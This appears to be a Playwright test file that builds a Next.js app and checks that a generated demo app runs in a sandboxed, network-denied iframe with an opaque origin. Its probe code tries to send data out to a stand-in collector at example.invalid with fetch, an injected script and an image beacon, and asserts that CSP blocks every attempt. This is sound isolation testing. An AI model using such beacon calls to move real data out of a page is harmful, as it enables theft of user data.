import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import {
  cpSync,
  mkdtempSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { createServer } from 'node:net';
import { basename, dirname, join, relative, resolve } from 'node:path';
import { test } from 'node:test';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright';

const root = resolve(fileURLToPath(new URL('..', import.meta.url)));

function canonical(value) {
  if (Array.isArray(value)) return `[${value.map(canonical).join(',')}]`;
  if (value && typeof value === 'object') {
    return `{${Object.keys(value)
      .sort()
      .map((key) => `${JSON.stringify(key)}:${canonical(value[key])}`)
      .join(',')}}`;
  }
  return JSON.stringify(value);
}

function digest(value) {
  return `sha256:${createHash('sha256')
    .update(`${canonical(value)}\n`)
    .digest('hex')}`;
}

function fixture() {
  const appDefinition = {
    schemaVersion: 'eai.generated_app_definition.v2',
    appKey: 'fleet-demo',
    appName: 'Fleet Demo',
    businessCard: {
      description: 'Manage cars',
      goal: 'See availability',
      audience: 'Fleet manager',
      outcome: 'Faster decisions',
    },
    workflow: {
      steps: [{ id: 'fleet', title: 'Fleet', viewId: 'fleet-view' }],
    },
    views: [
      { id: 'fleet-view', title: 'Fleet', componentIds: ['fleet-table'] },
    ],
    entryPath: 'src/generated/app.tsx',
  };
  const source = [
    "'use client';",
    "import { useState } from 'react';",
    "import type { GeneratedDemoAppProps } from '@/lib/generated-demo/contract';",
    'export default function GeneratedApp({ viewId, fixtures, runAction }: GeneratedDemoAppProps) {',
    '  const [count, setCount] = useState(0);',
    '  return <section><p data-testid="fixture-row">{String(fixtures.collections.vehicles[0].name)}</p><p data-testid="view">{viewId}</p><button type="button" onClick={() => { setCount(count + 1); runAction(\'book-car\'); }}>Book {count}</button></section>;',
    '}',
    '',
  ].join('\n');
  const sourceBundle = {
    schemaVersion: 'eai.generated_app_source.v1',
    files: [{ path: 'src/generated/app.tsx', content: source }],
  };
  const previewFixtures = {
    schemaVersion: 'eai.generated_app_fixtures.v1',
    collections: { vehicles: [{ id: 'car-1', name: 'Sample car' }] },
    actions: {
      'book-car': { effect: 'session-local', message: 'Simulated booking' },
    },
  };
  const objectTypeDefinitions = [];
  return {
    source,
    artifact: {
      schemaVersion: 'eai.generated_app_artifact.v2',
      appDefinition,
      sourceBundle,
      previewFixtures,
      objectTypeDefinitions,
      digests: {
        appDefinition: digest(appDefinition),
        sourceBundle: digest(sourceBundle),
        previewFixtures: digest(previewFixtures),
        objectTypeDefinitions: digest(objectTypeDefinitions),
      },
    },
  };
}

async function freePort() {
  const server = createServer();
  await new Promise((resolveReady, reject) => {
    server.once('error', reject);
    server.listen(0, '127.0.0.1', resolveReady);
  });
  const address = server.address();
  const port = address.port;
  await new Promise((resolveClosed) => server.close(resolveClosed));
  return port;
}

async function waitForServer(url, child) {
  for (let attempt = 0; attempt < 100; attempt += 1) {
    if (child.exitCode !== null)
      throw new Error(`Next server exited ${child.exitCode}`);
    try {
      const response = await fetch(url);
      if (response.ok) return;
    } catch {}
    await new Promise((resolveWait) => setTimeout(resolveWait, 200));
  }
  throw new Error('Next server did not become ready');
}

test(
  'production demo stays interactive in an opaque-origin network-denied frame',
  { timeout: 180_000 },
  async () => {
    const temp = mkdtempSync(join(dirname(root), 'eai-demo-isolation-'));
    let server;
    let browser;
    try {
      cpSync(root, temp, {
        recursive: true,
        filter: (sourcePath) => {
          const path = relative(root, sourcePath);
          if (!path) return true;
          const first = path.split('/')[0];
          return (
            ![
              '.git',
              '.next',
              'node_modules',
              '.eai-build',
              'playwright-report',
              'test-results',
            ].includes(first) &&
            !basename(sourcePath).startsWith('.env') &&
            basename(sourcePath) !== '.npmrc'
          );
        },
      });
      symlinkSync(
        join(root, 'node_modules'),
        join(temp, 'node_modules'),
        'dir',
      );
      const { source, artifact } = fixture();
      writeFileSync(join(temp, 'src/generated/app.tsx'), source);
      writeFileSync(
        join(temp, 'src/eai.config/generated-demo.json'),
        `${JSON.stringify(artifact, null, 2)}\n`,
      );
      const basePath = process.env.EAI_TEST_BASE_PATH ?? '';
      const env = {
        ...process.env,
        APP_BASE_PATH: basePath,
        NEXT_PUBLIC_APP_BASE_PATH: basePath,
        EAI_PRODUCT_SLUG: 'fleet-demo',
        AUTH_SECRET: 'local-isolation-test-secret',
        AUTH_TRUST_HOST: 'true',
      };
      const build = spawnSync('npm', ['run', 'build'], {
        cwd: temp,
        env,
        encoding: 'utf8',
        timeout: 120_000,
      });
      assert.equal(build.status, 0, `${build.stdout}\n${build.stderr}`);
      const port = await freePort();
      const origin = `http://127.0.0.1:${port}`;
      const appUrl = `${origin}${basePath}`;
      const apiPath = `${basePath}/api/eai/readiness`;
      server = spawn(
        process.execPath,
        [
          join(temp, 'node_modules/next/dist/bin/next'),
          'start',
          '--hostname',
          '127.0.0.1',
          '--port',
          String(port),
        ],
        {
          cwd: temp,
          env,
          stdio: 'ignore',
        },
      );
      await waitForServer(`${appUrl}/health`, server);
      browser = await chromium.launch({ headless: true });
      const context = await browser.newContext();
      await context.addCookies([
        {
          name: 'isolation_probe_secret',
          value: 'server-cookie-sentinel',
          url: origin,
        },
      ]);
      const page = await context.newPage();
      const requested = [];
      const failed = [];
      const received = [];
      const isProbe = (url) =>
        url.includes('/api/eai/') || url.includes('example.invalid');
      page.on('request', (request) => {
        if (isProbe(request.url())) requested.push(request.url());
      });
      page.on('requestfailed', (request) => {
        if (isProbe(request.url()))
          failed.push({
            url: request.url(),
            reason: request.failure()?.errorText,
          });
      });
      page.on('response', (response) => {
        if (isProbe(response.url())) received.push(response.url());
      });
      const response = await page.goto(appUrl, {
        waitUntil: 'domcontentloaded',
      });
      assert.equal(response.status(), 200);
      await page
        .frameLocator('iframe[title="Generated app demo"]')
        .locator('[data-testid="fixture-row"]')
        .waitFor();
      assert.equal(
        await page
          .locator('iframe[title="Generated app demo"]')
          .getAttribute('sandbox'),
        'allow-scripts',
      );
      assert.equal(
        await page
          .locator('iframe[title="Generated app demo"]')
          .getAttribute('src'),
        `${basePath}/eai-demo-frame`,
      );
      assert.equal(
        await page
          .locator('[data-eai-demo-source-digest]')
          .getAttribute('data-eai-demo-source-digest'),
        artifact.digests.sourceBundle,
      );
      assert.equal(
        await page
          .locator('[data-eai-demo-fixture-digest]')
          .getAttribute('data-eai-demo-fixture-digest'),
        artifact.digests.previewFixtures,
      );
      assert.equal(
        await page
          .frameLocator('iframe')
          .locator('[data-testid="fixture-row"]')
          .textContent(),
        'Sample car',
      );
      assert.doesNotMatch(
        await page.content(),
        /Sample car|server-cookie-sentinel|local-isolation-test-secret/,
      );
      await page
        .frameLocator('iframe')
        .getByRole('button', { name: 'Book 0' })
        .click();
      assert.equal(
        await page
          .frameLocator('iframe')
          .getByRole('button', { name: 'Book 1' })
          .count(),
        1,
      );
      assert.match(
        await page
          .frameLocator('iframe')
          .locator('[aria-live="polite"]')
          .textContent(),
        /This was a simulation/,
      );

      const frame = page.frame({ url: `${appUrl}/eai-demo-frame` });
      const before = requested.length;
      const beforeFailures = failed.length;
      const beforeResponses = received.length;
      const probe = await frame.evaluate(async (apiPath) => {
        const blocked = [];
        for (const target of [apiPath, 'https://example.invalid/collect']) {
          try {
            await globalThis['fetch'](target);
            blocked.push(false);
          } catch {
            blocked.push(true);
          }
        }
        const script = document.createElement('script');
        script.src = apiPath;
        document.body.append(script);
        const image = document.createElement('img');
        image.src = 'https://example.invalid/collect?data=sentinel';
        document.body.append(image);
        await new Promise((resolveWait) => setTimeout(resolveWait, 100));
        let parentDenied = false;
        let cookieDenied = false;
        try {
          void parent.document.body;
        } catch {
          parentDenied = true;
        }
        try {
          void document.cookie;
        } catch {
          cookieDenied = true;
        }
        return {
          blocked,
          parentDenied,
          cookieDenied,
          origin: globalThis.origin,
        };
      }, apiPath);
      assert.deepEqual(probe, {
        blocked: [true, true],
        parentDenied: true,
        cookieDenied: true,
        origin: 'null',
      });
      assert.deepEqual(received.slice(beforeResponses), []);
      for (const url of requested.slice(before)) {
        assert.ok(
          failed
            .slice(beforeFailures)
            .some(
              (failure) =>
                failure.url === url && /csp/i.test(failure.reason ?? ''),
            ),
          `probe request was not blocked by CSP: ${url}; failures: ${JSON.stringify(failed.slice(beforeFailures))}`,
        );
      }

      const direct = await context.newPage();
      const providerRequests = [];
      direct.on('request', (request) => {
        if (
          /\/api\/(?:auth|eai\/config)(?:\/|$)/.test(
            new URL(request.url()).pathname,
          )
        ) {
          providerRequests.push(request.url());
        }
      });
      const directResponse = await direct.goto(`${appUrl}/eai-demo-frame`, {
        waitUntil: 'domcontentloaded',
      });
      const policy = directResponse.headers()['content-security-policy'];
      assert.match(policy, /sandbox allow-scripts/);
      assert.doesNotMatch(policy, /allow-same-origin/);
      assert.match(policy, /connect-src 'none'/);
      await direct.locator('[data-testid="fixture-row"]').waitFor();
      assert.equal(await direct.evaluate(() => globalThis.origin), 'null');
      assert.deepEqual(providerRequests, []);
      assert.doesNotMatch(
        await direct.content(),
        /server-cookie-sentinel|local-isolation-test-secret/,
      );
      const normalAppStatus = await page.evaluate(
        async (apiPath) => (await fetch(apiPath)).status,
        apiPath,
      );
      assert.notEqual(normalAppStatus, 403);
      const serviceStatus = (await fetch(`${origin}${apiPath}`)).status;
      assert.notEqual(serviceStatus, 403);
      const deniedNavigation = page.waitForResponse((response) =>
        response.url().includes('/api/eai/readiness?frame-navigation-probe'),
      );
      await frame.evaluate(
        (apiPath) => location.assign(`${apiPath}?frame-navigation-probe`),
        apiPath,
      );
      assert.equal((await deniedNavigation).status(), 403);
      const deniedDirectNavigation = direct.waitForResponse((response) =>
        response.url().includes('/api/eai/readiness?direct-navigation-probe'),
      );
      await direct.evaluate(
        (apiPath) => location.assign(`${apiPath}?direct-navigation-probe`),
        apiPath,
      );
      assert.equal((await deniedDirectNavigation).status(), 403);
    } finally {
      await browser?.close();
      server?.kill('SIGTERM');
      rmSync(temp, { recursive: true, force: true });
    }
  },
);
